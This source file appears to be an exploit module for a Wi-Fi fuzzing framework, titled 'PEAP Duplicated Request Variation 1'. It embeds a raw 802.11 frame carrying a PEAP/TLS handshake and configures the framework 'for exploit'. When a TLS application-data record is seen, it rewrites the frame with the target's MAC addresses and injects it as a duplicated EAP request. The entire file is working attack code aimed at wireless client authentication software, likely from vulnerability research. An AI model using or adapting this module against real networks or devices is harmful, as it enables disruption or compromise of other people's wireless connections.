#include "ModulesInclude.hpp"

// Filters
static const char *filter_tls_application_data;

// Vars
static uint8_t packet_peap_request[] = {
    0x88, 0x2, 0x0, 0x0, 0xa8, 0x3, 0x2a, 0xeb,
    0xf5, 0x20, 0x0, 0xc0, 0xca, 0xac, 0xf1, 0x9b,
    0x0, 0xc0, 0xca, 0xac, 0xf1, 0x9b, 0x60, 0x0,
    0x0, 0x0, 0xaa, 0xaa, 0x3, 0x0, 0x0, 0x0,
    0x88, 0x8e, 0x2, 0x0, 0x3, 0xc5, 0x1, 0xd,
    0x3, 0xc5, 0x19, 0x1, 0xc5, 0x7b, 0xe1, 0xec,
    0x38, 0x66, 0x46, 0x90, 0xdf, 0xda, 0xaf, 0x53,
    0x48, 0xae, 0x40, 0x84, 0x6b, 0x28, 0x4, 0x45,
    0x1c, 0x5a, 0x24, 0xfa, 0xf6, 0xda, 0x79, 0xc8,
    0x16, 0x31, 0xe5, 0x9e, 0xbc, 0x62, 0x2a, 0x76,
    0x79, 0xb2, 0x7, 0xd8, 0x9, 0x61, 0xa1, 0x4e,
    0x2a, 0xb, 0x52, 0x91, 0xf5, 0xec, 0xbb, 0x67,
    0x5d, 0xb2, 0xa7, 0x6f, 0x2d, 0x8c, 0x1c, 0xd,
    0xb7, 0x33, 0xae, 0xaf, 0x17, 0xf7, 0x21, 0x17,
    0xa4, 0xde, 0xa6, 0x9f, 0x15, 0xde, 0x9, 0xc3,
    0xc6, 0xe0, 0x5d, 0x29, 0x2, 0x3, 0x1, 0x0,
    0x1, 0xa3, 0x82, 0x1, 0x34, 0x30, 0x82, 0x1,
    0x30, 0x30, 0x1d, 0x6, 0x3, 0x55, 0x1d, 0xe,
    0x4, 0x16, 0x4, 0x14, 0x82, 0x28, 0x29, 0x74,
    0x5, 0x29, 0x38, 0xda, 0x3, 0xab, 0x4a, 0x50,
    0xdf, 0x27, 0xf1, 0xae, 0xc9, 0x42, 0x4a, 0x97,
    0x30, 0x81, 0xc8, 0x6, 0x3, 0x55, 0x1d, 0x23,
    0x4, 0x81, 0xc0, 0x30, 0x81, 0xbd, 0x80, 0x14,
    0x82, 0x28, 0x29, 0x74, 0x5, 0x29, 0x38, 0xda,
    0x3, 0xab, 0x4a, 0x50, 0xdf, 0x27, 0xf1, 0xae,
    0xc9, 0x42, 0x4a, 0x97, 0xa1, 0x81, 0x99, 0xa4,
    0x81, 0x96, 0x30, 0x81, 0x93, 0x31, 0xb, 0x30,
    0x9, 0x6, 0x3, 0x55, 0x4, 0x6, 0x13, 0x2,
    0x46, 0x52, 0x31, 0xf, 0x30, 0xd, 0x6, 0x3,
    0x55, 0x4, 0x8, 0xc, 0x6, 0x52, 0x61, 0x64,
    0x69, 0x75, 0x73, 0x31, 0x12, 0x30, 0x10, 0x6,
    0x3, 0x55, 0x4, 0x7, 0xc, 0x9, 0x53, 0x6f,
    0x6d, 0x65, 0x77, 0x68, 0x65, 0x72, 0x65, 0x31,
    0x15, 0x30, 0x13, 0x6, 0x3, 0x55, 0x4, 0xa,
    0xc, 0xc, 0x45, 0x78, 0x61, 0x6d, 0x70, 0x6c,
    0x65, 0x20, 0x49, 0x6e, 0x63, 0x2e, 0x31, 0x20,
    0x30, 0x1e, 0x6, 0x9, 0x2a, 0x86, 0x48, 0x86,
    0xf7, 0xd, 0x1, 0x9, 0x1, 0x16, 0x11, 0x61,
    0x64, 0x6d, 0x69, 0x6e, 0x40, 0x65, 0x78, 0x61,
    0x6d, 0x70, 0x6c, 0x65, 0x2e, 0x63, 0x6f, 0x6d,
    0x31, 0x26, 0x30, 0x24, 0x6, 0x3, 0x55, 0x4,
    0x3, 0xc, 0x1d, 0x45, 0x78, 0x61, 0x6d, 0x70,
    0x6c, 0x65, 0x20, 0x43, 0x65, 0x72, 0x74, 0x69,
    0x66, 0x69, 0x63, 0x61, 0x74, 0x65, 0x20, 0x41,
    0x75, 0x74, 0x68, 0x6f, 0x72, 0x69, 0x74, 0x79,
    0x82, 0x9, 0x0, 0xc9, 0xe5, 0x80, 0xbd, 0x5c,
    0xce, 0xc9, 0xa3, 0x30, 0xc, 0x6, 0x3, 0x55,
    0x1d, 0x13, 0x4, 0x5, 0x30, 0x3, 0x1, 0x1,
    0xff, 0x30, 0x36, 0x6, 0x3, 0x55, 0x1d, 0x1f,
    0x4, 0x2f, 0x30, 0x2d, 0x30, 0x2b, 0xa0, 0x29,
    0xa0, 0x27, 0x86, 0x25, 0x68, 0x74, 0x74, 0x70,
    0x3a, 0x2f, 0x2f, 0x77, 0x77, 0x77, 0x2e, 0x65,
    0x78, 0x61, 0x6d, 0x70, 0x6c, 0x65, 0x2e, 0x63,
    0x6f, 0x6d, 0x2f, 0x65, 0x78, 0x61, 0x6d, 0x70,
    0x6c, 0x65, 0x5f, 0x63, 0x61, 0x2e, 0x63, 0x72,
    0x6c, 0x30, 0xd, 0x6, 0x9, 0x2a, 0x86, 0x48,
    0x86, 0xf7, 0xd, 0x1, 0x1, 0xb, 0x5, 0x0,
    0x3, 0x81, 0x81, 0x0, 0x7a, 0xec, 0x4e, 0x4,
    0xf2, 0x27, 0x48, 0x94, 0x4a, 0x0, 0x8b, 0x1e,
    0x33, 0x13, 0xe6, 0x1, 0xa6, 0xed, 0x2, 0xa2,
    0x8d, 0xb2, 0x56, 0x52, 0x9a, 0x91, 0xb8, 0x1d,
    0xed, 0xe5, 0x90, 0xab, 0x7e, 0x1c, 0xcd, 0xe3,
    0x7f, 0x39, 0xd4, 0xb7, 0x7a, 0x6c, 0x98, 0x3e,
    0xe3, 0xd6, 0x11, 0x56, 0x4b, 0x89, 0x7b, 0x29,
    0x7c, 0xf3, 0x6a, 0x3b, 0xda, 0x19, 0x8c, 0x9b,
    0xe, 0xae, 0x4d, 0xf4, 0xca, 0xab, 0xe, 0x38,
    0x46, 0x9f, 0x75, 0x57, 0x66, 0xa3, 0x8b, 0x31,
    0x43, 0x43, 0x2f, 0xb3, 0x90, 0xab, 0xde, 0x93,
    0xce, 0xa, 0xac, 0x4c, 0x14, 0xf5, 0x76, 0x65,
    0x52, 0x6c, 0xd9, 0x6d, 0x3d, 0x8, 0x22, 0x1,
    0xe2, 0x80, 0x93, 0x7b, 0x66, 0x1f, 0x89, 0x51,
    0x46, 0x2f, 0x4c, 0x4c, 0x14, 0xb2, 0x27, 0xa2,
    0x3d, 0xd8, 0x96, 0x1c, 0x4b, 0x91, 0xfa, 0x6,
    0xce, 0x19, 0xc0, 0x27, 0x16, 0x3, 0x3, 0x1,
    0x91, 0xc, 0x0, 0x1, 0x8d, 0x3, 0x0, 0x19,
    0x85, 0x4, 0x0, 0xee, 0x64, 0xc5, 0x4f, 0xd8,
    0x52, 0xf3, 0xc9, 0x64, 0x3f, 0x30, 0x56, 0xc8,
    0x4b, 0x1b, 0x2c, 0xa7, 0xfa, 0xe5, 0x3c, 0xf5,
    0x2f, 0x47, 0xe1, 0xc8, 0x80, 0x93, 0x60, 0x8e,
    0x17, 0x16, 0xbc, 0x30, 0x88, 0xc, 0x31, 0xf4,
    0xbb, 0x1b, 0xca, 0x1a, 0x4e, 0x16, 0x83, 0xed,
    0xff, 0xa9, 0x3f, 0xf6, 0x3, 0xcf, 0x73, 0xfa,
    0x85, 0x53, 0xc7, 0x2f, 0x41, 0xe, 0x6e, 0x60,
    0x48, 0x64, 0x46, 0xd4, 0x1, 0x63, 0xfa, 0xb0,
    0x27, 0xda, 0x2c, 0xb, 0xb1, 0x1b, 0xf4, 0xcb,
    0x31, 0xb, 0x59, 0xa1, 0x3a, 0xea, 0xad, 0xbf,
    0x8f, 0x88, 0x68, 0xa2, 0x68, 0x12, 0x46, 0xc6,
    0x36, 0x7a, 0x33, 0xa2, 0xfc, 0x67, 0xfe, 0xbc,
    0x24, 0x9, 0xff, 0x11, 0x45, 0xc6, 0x6e, 0x1a,
    0x14, 0xc, 0x4f, 0x64, 0xe9, 0x57, 0xd0, 0xa6,
    0xd4, 0x1d, 0x3a, 0xb9, 0x1f, 0xbc, 0x62, 0x34,
    0xaa, 0x1b, 0xb4, 0x98, 0xa6, 0x2c, 0x6, 0x1,
    0x1, 0x0, 0x9c, 0x12, 0xf0, 0x17, 0xa, 0x21,
    0x6a, 0x7b, 0x1b, 0x1d, 0x69, 0x85, 0x1a, 0x43,
    0x93, 0xc7, 0x39, 0xd9, 0xbf, 0xd1, 0x4, 0x2f,
    0x3a, 0x43, 0x18, 0xf0, 0x71, 0xc8, 0x78, 0xb0,
    0x69, 0x2, 0x11, 0x5, 0x94, 0xda, 0x9e, 0xc9,
    0xa5, 0x65, 0x33, 0x2, 0x5e, 0x48, 0x15, 0x88,
    0x11, 0xb2, 0xda, 0x27, 0xed, 0xd6, 0x1d, 0xfb,
    0xfb, 0xc4, 0xa0, 0xb9, 0x92, 0x5a, 0x46, 0xdd,
    0x59, 0xaa, 0x8a, 0xec, 0x6a, 0x2f, 0x89, 0x7,
    0x7b, 0x28, 0x26, 0x66, 0x1d, 0x92, 0xb4, 0x18,
    0x3f, 0xd0, 0x44, 0x99, 0xef, 0x25, 0xa, 0x43,
    0x53, 0x80, 0x4a, 0xc3, 0xab, 0x7e, 0x87, 0xbd,
    0x9d, 0x74, 0xd7, 0xd2, 0x38, 0x8, 0xa2, 0x17,
    0xff, 0xcb, 0xed, 0xed, 0x77, 0x71, 0xe0, 0x8,
    0xce, 0xc2, 0x18, 0xf9, 0xba, 0x7a, 0x96, 0x9,
    0xeb, 0xbd, 0xb, 0x86, 0x90, 0xfd, 0x82, 0xa0,
    0xe1, 0x49, 0x77, 0x6b, 0x63, 0x23, 0xec, 0xb9,
    0xf7, 0x3c, 0x7, 0x6, 0xa7, 0x5, 0xf6, 0x98,
    0x4e, 0xf8, 0xe2, 0xe4, 0x3a, 0x16, 0x6e, 0x26,
    0xa4, 0xd9, 0xf5, 0x65, 0xa8, 0xbc, 0xf2, 0x4e,
    0x74, 0xb0, 0x55, 0x63, 0x82, 0x62, 0x75, 0xf,
    0x16, 0xfa, 0x2b, 0xc6, 0x63, 0xf2, 0x24, 0x9a,
    0x30, 0x72, 0xb0, 0x74, 0x7a, 0x8f, 0x2, 0xd8,
    0x99, 0xe6, 0x27, 0xab, 0x5a, 0x94, 0x27, 0xd4,
    0x2a, 0x21, 0xcb, 0xbf, 0x25, 0x2f, 0xa4, 0xea,
    0x54, 0x23, 0x3b, 0xa7, 0x81, 0xfc, 0xe0, 0x82,
    0xae, 0x6, 0xf5, 0x8f, 0x31, 0xc6, 0x69, 0x5e,
    0xaf, 0xf5, 0xbc, 0xd8, 0x49, 0x5, 0x55, 0x33,
    0xbe, 0x5c, 0x47, 0xbe, 0x65, 0x75, 0xd, 0x48,
    0x4e, 0xe2, 0x19, 0xbe, 0x48, 0x7a, 0xf7, 0x1e,
    0x82, 0xec, 0xef, 0x10, 0x26, 0x69, 0x94, 0x96,
    0xce, 0x84, 0xdc, 0xc2, 0x81, 0xb8, 0xbe, 0x94,
    0x6a, 0x89, 0x16, 0x3, 0x3, 0x0, 0x4, 0xe,
    0x0, 0x0, 0x0};

// Setup
const char *module_name()
{
    return "PEAP Duplicated Request Variation 1";
}

int setup(void *p)
{
    // Change required configuration for exploit
    Config *config = (Config *)p;
    config->options.auto_start = true;
    config->fuzzing.enable_duplication = false;
    config->fuzzing.enable_mutation = false;
    config->fuzzing.enable_optimization = false;
    config->fuzzing.packet_retry = false;

    filter_tls_application_data = packet_register_filter("tls.record.content_type == 23");

    return 0;
}

// TX
int tx_pre_dissection(uint8_t *pkt_buf, int pkt_length, void *p)
{
    packet_set_filter(filter_tls_application_data);
    return 0;
}

int tx_post_dissection(uint8_t *pkt_buf, int pkt_length, void *p)
{
    if (packet_read_filter(filter_tls_application_data)) {
        // Copy target mac address to existent packet
        // Update mac addresses
        memcpy(packet_peap_request + 4, pkt_buf + 4, 6 * 3);
        send_packet(p, packet_peap_request, sizeof(packet_peap_request), 3);
    }
    return 0;
}
